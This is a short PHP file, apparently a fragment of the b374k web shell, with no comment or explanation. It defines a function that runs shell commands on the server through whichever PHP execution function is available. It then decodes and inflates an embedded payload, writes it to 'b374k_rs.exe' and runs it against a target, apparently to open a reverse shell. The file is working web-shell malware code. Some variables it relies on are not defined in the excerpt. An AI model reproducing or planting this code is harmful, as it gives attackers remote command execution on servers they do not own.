<?php
function exe($c){
	$out = "";
	$c = $c." 2>&1";

	if(is_callable('system')) {
		ob_start();
		@system($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	if(is_callable('shell_exec')){
		$out = @shell_exec($c);
		
	}
	if(is_callable('exec')) {
		@exec($c,$r);
	}
	if(is_callable('passthru')) {
		ob_start();
		@passthru($c);
		$out = ob_get_contents();
		ob_end_clean();
	}
	return $out;
}

$fc = $_REQUEST['rs'];
$fc = gzinflate(base64_decode($rscode));
$fpath = "b374k_rs.exe";
if($file=fopen($fpath,"w")){
	fwrite($file,$fc);
	fclose($file);
			
	$result = exe($fpath." ".$rstarget);					
}
?>